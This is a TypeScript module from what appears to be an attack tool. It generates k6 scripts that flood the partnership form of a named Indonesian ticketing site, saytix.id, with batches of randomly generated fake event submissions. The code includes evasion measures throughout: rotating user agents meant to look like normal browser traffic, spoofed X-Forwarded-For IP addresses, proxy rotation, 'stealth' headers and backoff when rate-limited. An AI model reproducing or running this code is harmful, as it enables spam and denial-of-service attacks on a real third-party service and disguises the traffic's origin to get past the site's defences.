import type { AttackOptions } from "../runner.js";
import { sanitizeForScript } from "../../utils/sanitizer.js";
import { generateStealthHelpersScript } from "./utils/stealth.js";

function buildThresholds(opts: AttackOptions): string {
	if (!opts.thresholds || opts.thresholds.length === 0) return "";
	const grouped: Record<string, string[]> = {};
	for (const t of opts.thresholds) {
		const colonIndex = t.indexOf(":");
		if (colonIndex === -1) continue;
		const metric = t.slice(0, colonIndex);
		const condition = t.slice(colonIndex + 1);
		if (!grouped[metric]) grouped[metric] = [];
		grouped[metric].push(condition);
	}
	const lines = Object.entries(grouped).map(([metric, conditions]) => {
		const conditionsStr = conditions.map((c) => JSON.stringify(c)).join(", ");
		return `    "${metric}": [${conditionsStr}]`;
	});
	return `,
    thresholds: {
${lines.join(",\n")}
    }`;
}

export function formFlood1Template(opts: AttackOptions): string {
	const headersStr = Object.entries(opts.headers)
		.map(([k, v]) => `${sanitizeForScript(k)}: ${sanitizeForScript(v)}`)
		.join(", ");

	const batchSize = Math.min(Math.max(opts.rpsPerVu || 10, 1), 50);

	const hasProxyList = opts.proxyList.length > 0;
	const actualTarget = sanitizeForScript(opts.target);

	const checkBlock = opts.noCheck
		? ""
		: `  for (const res of responses) {
    check(res, {
      "status was 200": (r) => r.status === 200 || r.status === 201 || r.status === 302,
    });
  }`;

	// Random data generation helpers
	const randomDataHelpers = `
// Realistic User Agents to appear as normal browser traffic
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Edg/120.0.0.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1"
];

function randomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

// Random data generators for form fields
function randomString(length) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function randomEmail() {
  const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'mail.com', 'protonmail.com', 'icloud.com', 'test.com', 'example.org', 'fake.net'];
  const username = randomString(8 + Math.floor(Math.random() * 8));
  const domain = domains[Math.floor(Math.random() * domains.length)];
  return username + '@' + domain;
}

function randomPhone() {
  const prefixes = ['081', '082', '083', '085', '087', '088', '089', '0812', '0813', '0814', '0815', '0816', '0851', '0852', '0853', '0856', '0857', '0858'];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const suffix = Math.floor(10000000 + Math.random() * 90000000).toString().slice(0, 9 - prefix.length + 3);
  return prefix + suffix;
}

function randomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomParagraph() {
  const words = ['business', 'partnership', 'company', 'growth', 'opportunity', 'collaboration', 'innovation', 'technology', 'development', 'strategy', 'management', 'solution', 'service', 'product', 'market', 'industry', 'enterprise', 'platform', 'application', 'system', 'integration', 'automation', 'optimization', 'performance', 'scalability', 'security', 'analytics', 'dashboard', 'report', 'insight', 'customer', 'partner', 'vendor', 'supplier', 'client', 'user', 'team', 'organization', 'department', 'project'];
  let result = '';
  const length = 10 + Math.floor(Math.random() * 40);
  for (let i = 0; i < length; i++) {
    result += words[Math.floor(Math.random() * words.length)] + ' ';
  }
  return result.trim() + '.';
}

// Generate data specific for Saytix.id partnership form
function generateFormData() {
  const data = {};
  
  // Generate random event name
  const eventAdjectives = ['Mega', 'Super', 'Amazing', 'Ultimate', 'Epic', 'Grand', 'Premium', 'Exclusive'];
  const eventTypes = ['Concert', 'Festival', 'Show', 'Party', 'Night', 'Live', 'Experience', 'Tour'];
  const eventNames = ['Harmony', 'Rhythm', 'Beat', 'Sound', 'Music', 'Vibes', 'Energy', 'Wave'];
  
  data['event_name'] = randomFrom(eventAdjectives) + ' ' + randomFrom(eventNames) + ' ' + randomFrom(eventTypes) + ' ' + randomNumber(2025, 2027);
  
  // Generate event description
  const descriptions = [
    'Konser musik terbesar tahun ini dengan artis internasional dan lokal. Pengalaman tak terlupakan bagi para penggemar musik.',
    'Festival musik multigenre yang menghadirkan berbagai artis dari berbagai genre. Menyajikan pengalaman musik yang luar biasa.',
    'Event musik eksklusif dengan konsep unik dan venue premium. Tiket terbatas untuk pengalaman yang lebih intim.',
    'Pertunjukan live spectacular dengan produksi world-class. Sound system premium dan lighting yang memukau.',
    'Konser amal untuk membantu komunitas musik lokal. Semua pendapatan akan disumbangkan untuk perkembangan musik Indonesia.'
  ];
  data['event_description'] = randomFrom(descriptions) + ' ' + randomParagraph();
  
  // Generate random future date
  const futureDate = new Date();
  futureDate.setMonth(futureDate.getMonth() + randomNumber(1, 12));
  futureDate.setDate(randomNumber(1, 28));
  data['event_date'] = futureDate.toISOString().split('T')[0];
  
  // Generate location
  const cities = ['Jakarta', 'Bandung', 'Surabaya', 'Bali', 'Yogyakarta', 'Medan', 'Makassar'];
  const venues = ['Stadium', 'Convention Center', 'Expo Hall', 'Arena', 'Theater', 'Beach Club', 'Park'];
  const city = randomFrom(cities);
  const venue = randomFrom(venues);
  data['event_location'] = venue + ' ' + randomString(8) + ', ' + city + ', Indonesia. ' + randomString(15) + ' venue dengan kapasitas ' + randomNumber(1000, 50000) + ' orang.';
  
  // Generate email
  data['email'] = randomEmail();
  
	// Generate phone (format Indonesia) - field name is phone_number for API
  data['phone_number'] = randomPhone();
  
  return data;
}

function randomFrom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}
`;

	// Random IP generator
	const xffScript = `
function randomIP() {
  const ranges = [
    [1, 126], [128, 191], [192, 223],
  ];
  const range = ranges[Math.floor(Math.random() * ranges.length)];
  const a = Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0];
  const b = Math.floor(Math.random() * 256);
  const c = Math.floor(Math.random() * 256);
  const d = Math.floor(Math.random() * 254) + 1;
  return a + "." + b + "." + c + "." + d;
}
`;

	const proxyRotationScript = hasProxyList
		? `
const PROXY_LIST = JSON.parse(__ENV.PROXY_LIST || "[]");

function randomProxy() {
  if (PROXY_LIST.length === 0) return undefined;
  return PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
}
`
		: "";

	const defaultHeaders = headersStr || `"User-Agent": randomUserAgent()`;

	const proxyParam = hasProxyList
		? `    const proxyUrl = randomProxy();\n`
		: "";
	const proxyObj = hasProxyList
		? `, ...(proxyUrl ? { proxy: proxyUrl } : {})`
		: "";

	const buildRequestParams = (headerExpr: string) =>
		`{ headers: ${headerExpr}, timeout: "15s"${proxyObj} }`;

	const stealthBlock = opts.stealth
		? `${generateStealthHelpersScript()}
${xffScript}${randomDataHelpers}${proxyRotationScript}
const BASE_HEADERS = { 
  ${defaultHeaders},
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*",
  "Referer": ${sanitizeForScript(opts.target)},
  "Origin": "https://saytix.id"
};

export default function () {
  const stealthHeaders = generateStealthHeaders();
  const mergedHeaders = Object.assign({}, BASE_HEADERS, stealthHeaders, { "X-Forwarded-For": randomIP() });
${proxyParam}
  const params = ${buildRequestParams("mergedHeaders")};

  const requests = [];
  for (let i = 0; i < BATCH_SIZE; i++) {
    const formData = generateFormData();
    const payload = JSON.stringify(formData);
    
    requests.push(["POST", TARGET, payload, params]);
  }

  const responses = http.batch(requests);
  ${checkBlock}
  
  // Check for 429 and backoff if needed
  let has429 = false;
  for (const res of responses) {
    if (res && res.status === 429) {
      has429 = true;
      break;
    }
  }
  if (has429) {
    handleBackoff({ status: 429 });
  }
  
  stealthSleep();
}`
		: `${xffScript}${randomDataHelpers}${proxyRotationScript}
const HEADERS = { 
  ${defaultHeaders},
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*",
  "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
  "Accept-Encoding": "gzip, deflate, br",
  "Referer": ${sanitizeForScript(opts.target)},
  "Origin": "https://saytix.id",
  "X-Forwarded-For": randomIP()
};

export default function () {
  const reqHeaders = Object.assign({}, HEADERS, { "X-Forwarded-For": randomIP() });
${proxyParam}
  const params = ${buildRequestParams("reqHeaders")};

  const requests = [];
  for (let i = 0; i < BATCH_SIZE; i++) {
    const formData = generateFormData();
    const payload = JSON.stringify(formData);
    
    requests.push(["POST", TARGET, payload, params]);
  }

  const responses = http.batch(requests);
${checkBlock}
}`;

	const optionsBlock = `  scenarios: {
    form_flood: {
      executor: "constant-vus",
      vus: ${opts.vus},
      duration: ${sanitizeForScript(opts.duration)},
      gracefulStop: "5s",
    },
  },`;

	const thresholdBlock = buildThresholds(opts);

	return `import http from "k6/http";
import { check, sleep } from "k6";

export const options = {
${optionsBlock}${thresholdBlock}
};

const TARGET = ${actualTarget};
const BATCH_SIZE = ${batchSize};

${stealthBlock}
`;
}
